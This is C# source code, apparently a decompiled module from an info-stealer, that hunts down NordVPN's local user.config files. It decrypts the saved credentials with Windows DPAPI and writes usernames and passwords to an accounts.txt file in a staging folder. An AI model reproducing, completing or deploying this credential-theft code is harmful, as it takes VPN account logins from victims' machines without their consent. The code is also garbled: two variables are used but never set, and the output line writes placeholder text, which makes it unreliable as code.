﻿using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace youknowcaliber
{
	internal class NordVPN
	{
		private static string Decode(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		public static void Save()
		{
			string exploitDir = Help.ExploitDir;
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
			bool flag = !directoryInfo.Exists;
			if (!flag)
			{
				try
				{
					foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories("NordVpn.exe*"))
					{
						foreach (DirectoryInfo directoryInfo3 in directoryInfo2.GetDirectories())
						{
							string text = Path.Combine(directoryInfo3.FullName, "user.config");
							bool flag2 = File.Exists(text);
							if (flag2)
							{
								Directory.CreateDirectory(exploitDir + "\\VPN\\NordVPN\\");
								XmlDocument xmlDocument = new XmlDocument();
								xmlDocument.Load(text);
								bool flag3 = innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2);
								if (flag3)
								{
									string text2 = NordVPN.Decode(innerText);
									string text3 = NordVPN.Decode(innerText2);
									Counting.NordVPN++;
									File.AppendAllText(exploitDir + "\\VPN\\NordVPN\\\\accounts.txt", "Username: {username}\nPassword: {password}\n\n");
								}
							}
						}
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}
	}
}
